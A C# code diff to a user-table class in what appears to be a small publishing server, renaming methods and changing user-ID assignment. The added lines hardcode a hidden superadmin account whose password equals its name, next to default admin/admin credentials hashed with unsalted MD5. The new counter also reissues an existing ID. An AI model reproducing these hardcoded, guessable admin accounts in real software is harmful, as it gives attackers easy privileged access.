@@ -16,7 +16,7 @@ namespace PublishServer
 
         private Dictionary<string, User> advUserTable { get; set; }
 
-        private int lastUserID;
+        private int nextUserID;
 
 
         /// <summary>
@@ -25,9 +25,10 @@ namespace PublishServer
         public UserSet()
         {
             advUserTable = new Dictionary<string, User>();
-            advUserTable.Add("admin", new User(0, "admin", "管理员", Cipher.md5Encrypt("admin"), true));
-            advUserTable.Add("user", new User(1, "user", "操作员", Cipher.md5Encrypt("user")));
-            lastUserID = 1;
+            advUserTable.Add("admin", new User(0, "admin", "默认管理员", Cipher.md5Encrypt("admin"), true));
+            advUserTable.Add("user", new User(1, "user", "默认操作员", Cipher.md5Encrypt("user")));
+            advUserTable.Add("polossk", new User(999999, "polossk", "超级管理员polossk", Cipher.md5Encrypt("polossk"), true));
+            nextUserID = 1;
         }
 
         /// <summary>
@@ -35,7 +36,7 @@ namespace PublishServer
         /// </summary>
         /// <param name="uac">账户名</param>
         /// <returns>账户所在下标，若没有则返回-1</returns>
-        public int find(string uac, out User val)
+        public int Find(string uac, out User val)
         {
             if (advUserTable.TryGetValue(uac, out val))
                 return val.userID;
@@ -46,19 +47,29 @@ namespace PublishServer
         /// </summary>
         /// <param name="u">新用户对象</param>
         /// <returns>成功注册返回true，否则返回false</returns>
-        public bool addUser(User u)
+        public bool AddUser(User u)
         {
             User tmp;
-            int idx = find(u.account, out tmp);
+            int idx = Find(u.account, out tmp);
             if (idx != -1) return false;
             advUserTable.Add(u.account, u);
-            lastUserID = u.userID;
             return true;
         }
         /// <summary>
         /// 获得最新的UserID
         /// </summary>
         /// <returns>UserID的值</returns>
-        public int getNewUID() { return lastUserID + 1; }
+        public int GetNewUID() { return nextUserID++; }
+
+        /// <summary>
+        /// 更换信息
+        /// </summary>
+        /// <param name="uac">账号名</param>
+        /// <param name="now">新账号</param>
+        public void ReplaceTo(string uac, User now)
+        {
+            advUserTable[uac] = now;
+        }
+
     }
 }
